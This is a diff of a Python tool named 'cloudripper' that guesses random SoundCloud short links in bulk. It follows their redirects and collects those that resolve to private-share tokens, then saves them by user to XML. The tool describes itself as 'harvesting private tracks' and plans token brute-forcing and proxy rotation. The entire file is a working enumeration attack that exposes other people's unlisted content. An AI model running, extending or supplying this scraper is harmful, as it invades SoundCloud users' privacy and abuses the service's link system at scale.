@@ -1,76 +1,123 @@
-import os
+#sound-cloudripper, [scalable update]
+import argparse
 import asyncio
-import requests
-import re
-import warnings
-from colorama import Fore
-from urllib.parse import urlparse, urlunparse
 import random
 import string
+import aiohttp
+import re
+import os
+from colorama import Fore
 import xml.etree.ElementTree as ET
+from urllib.parse import urlparse, urlunparse
 
-# Ignore RuntimeWarning
-warnings.simplefilter('ignore', RuntimeWarning)
+#=====================CORE=====================================>>
+#==============================================================>>
+async def fetch_url(session, url):
+    async with session.get(url, allow_redirects=False) as response:
+        return response, await response.text()
 
-async def check_single_url(short_url, valid_urls, xml_root):
-    response = await asyncio.to_thread(requests.get, short_url, allow_redirects=False)
+async def main(num_runs):
+    #keep track of total requests
+    total_requests = 0
+    matched_urls = []
+    print(Fore.LIGHTGREEN_EX + "[!] harvesting private tracks..." + Fore.RESET)
+    for _ in range(num_runs):
+        #random link gen
+        urls = [f"https://on.soundcloud.com/{''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))}" for _ in range(100)]
+        #aiohttp x async super multithread of doom
+        async with aiohttp.ClientSession() as session:
+            tasks = [fetch_url(session, url) for url in urls]
+            responses = await asyncio.gather(*tasks)
 
-    if response.status_code == 302:
-        full_url = response.headers.get('Location', '')
-        parsed_url = urlparse(full_url)
-        url_final = urlunparse(parsed_url._replace(query=''))
+            for url, (response, text) in zip(urls, responses):
+                #intercept redirection code, extract Location URL
+                if response.status == 302:
+                    full_url = response.headers.get('Location', '')
+                    url_final = urlunparse(urlparse(full_url)._replace(query=''))
+                    #Regex to match private tokens
+                    match = re.search(r'/s-[a-zA-Z0-9]{11}', url_final)
 
-        match = re.search(r's-[a-zA-Z0-9]{11}', url_final)
+                    if match:
+                        if(args.verbose):
+                            print(Fore.LIGHTCYAN_EX + "[+] match : ", url_final)
+                        total_requests += 1
+                        matched_urls.append(url_final)
+                    else:
+                        if(args.very_verbose):
+                            print(Fore.YELLOW + "[-] not private")
+                        total_requests += 1
+                else:
+                    if(args.very_verbose):
+                        print(Fore.RED + "[x] not found")
+                    total_requests += 1
+    #============================================================================================
+    #===================ON PROGRAM FINISH========================================================
 
-        if match:
-            if short_url not in valid_urls:
-                valid_urls.add(short_url)
-                entry = ET.SubElement(xml_root, "track")
-                entry.text = short_url + "\n"
-                print(Fore.GREEN + "[+] Valid URL : ", short_url)
-            else:
-                print(Fore.YELLOW + "[*] URL already recorded : ", short_url)
-        else:
-            print(Fore.RED + "[-] Invalid URL : ", short_url)
+    print(Fore.LIGHTGREEN_EX + "[!] finished ! matched", len(matched_urls) ,"links, for a total of" , total_requests ,"requests <3")
 
-async def check(num_urls_to_generate):
-    valid_urls = set()
+    #END OF MAIN SECTION ===============================================================================
 
-    folder_name = "Hits"
-    file_name = "hits.xml"
+    if args.loop is None:
+        print(Fore.LIGHTYELLOW_EX + "[?] use 'ripper.py -h' or '--help' to view commands")
 
-    if os.path.exists(os.path.join(folder_name, file_name)):
-        existing_tree = ET.parse(os.path.join(folder_name, file_name))
-        existing_root = existing_tree.getroot()
+    #export to xml if xml switch is true
+    if (args.xml_export):
+        xml_export(matched_urls)
 
-        for track in existing_root:
-            url = track.text.strip()
-            valid_urls.add(url)
 
-    xml_root = ET.Element("tracks")
+#=======================additional functions=====================================================================
+def xml_export(links):
+    print(Fore.MAGENTA + "[+] XML export...")
+    data = ET.Element("data")
+    if not os.path.exists("output.xml"):
+        print(Fore.MAGENTA + "[+] creating output.xml...")
+        data = ET.Element("data")
+    else:
+        tree = ET.parse("output.xml")
+        data = tree.getroot()
 
-    tasks = []
+    for link in links:
+        random_name = link.split("/")[-3]
+        user_element = next((user for user in data.findall("user") if user.get("name") == random_name), None)
 
-    print("\n\n< Checking... >\n")
+        if user_element is None:
+            user_element = ET.Element("user")
+            user_element.set("name", random_name)
+            data.append(user_element)
 
-    for _ in range(num_urls_to_generate):
-        characters = string.ascii_letters + string.digits
-        rand = ''.join(random.choice(characters) for _ in range(5))
-        short_url = "https://on.soundcloud.com/" + rand
+        link_element = ET.Element("link")
+        link_element.text = link
+        user_element.append(link_element)
+    ET.ElementTree(data).write("output.xml", encoding="utf-8", xml_declaration=True)
+    print(Fore.GREEN + "[+] done !")
 
-        task = check_single_url(short_url, valid_urls, xml_root)
-        tasks.append(task)
 
-    await asyncio.gather(*tasks)
 
-    existing_root.extend(xml_root)
 
-    with open(os.path.join(folder_name, file_name), "wb") as xml_file:
-        xml_tree = ET.ElementTree(existing_root)
-        xml_tree.write(xml_file, encoding="utf-8", xml_declaration=True)
-
-    print(Fore.YELLOW + f"\n[!] Finished ! {len(valid_urls)} private tracks found on {num_urls_to_generate} generated URL <3\n")
-
+#ENTRY POINT
 if __name__ == "__main__":
-    num_urls = int(input("\nNumber of Short URL : "))
-    asyncio.run(check(num_urls))
+    print(Fore.LIGHTGREEN_EX + "------------------------------------------")
+    print(Fore.LIGHTGREEN_EX + "/ / / / / " + Fore.LIGHTYELLOW_EX + "C L O U D R I P P E R" + Fore.LIGHTGREEN_EX + " / / / / /")
+    print(Fore.LIGHTGREEN_EX + "------------------------------------------" + Fore.RESET)
+    print(Fore.RESET + "created by " + Fore.MAGENTA + "yuuechka<3" + Fore.RESET + " & " + Fore.LIGHTRED_EX + "fancymalware(mk0)" + Fore.RESET)
+    print(Fore.LIGHTGREEN_EX + "------------------------------------------" + Fore.RESET)
+    #ARGS PARSER --------------------------------------------------------------------------------------------
+    parser = argparse.ArgumentParser(description="-----manual-----")
+    parser.add_argument('-l', '--loop', type=int, help="the program will loop n times")
+    parser.add_argument('-x', '--xml_export', action='store_true', help="export found tracks in a XML file")
+    parser.add_argument('-v', '--verbose', action='store_true', help="verbose mode, show more informations")
+    parser.add_argument('-vv', '--very_verbose', action='store_true', help="very verbose mode, show ALL informations")
+    #todo : -r <-> bruteforces private token
+    #todo : -p <-> proxylist support ?
+    #--------------------------------------------------------------------------------------------------------
+    # take arguments in args
+    args = parser.parse_args()
+    
+    #num_runs = int(input("how much cycles (need to to switchs instead)>"))
+    if(args.loop is not None):
+        runs = args.loop * 100
+        print(Fore.LIGHTGREEN_EX + "[!] starting the script for approximately ", runs, " requests...")
+        asyncio.run(main(args.loop))
+    else:
+        print(Fore.LIGHTGREEN_EX + "[!] starting the script with the default value (only one cycle)")
+        asyncio.run(main(1))
